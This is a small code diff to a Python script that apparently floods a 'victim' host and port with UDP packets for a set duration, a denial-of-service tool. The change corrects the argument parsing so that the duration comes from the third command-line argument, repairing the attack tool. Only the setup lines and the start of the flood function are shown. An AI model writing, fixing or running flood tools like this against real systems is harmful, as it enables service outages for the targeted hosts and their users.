@@ -2,7 +2,7 @@ import time, sys, socket, random
 
 victim = str(sys.argv[1])
 vport = int(sys.argv[2])
-duration = int(sys.argv[1])
+duration = int(sys.argv[3])
 
 def flood(victim, vport, duration):
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
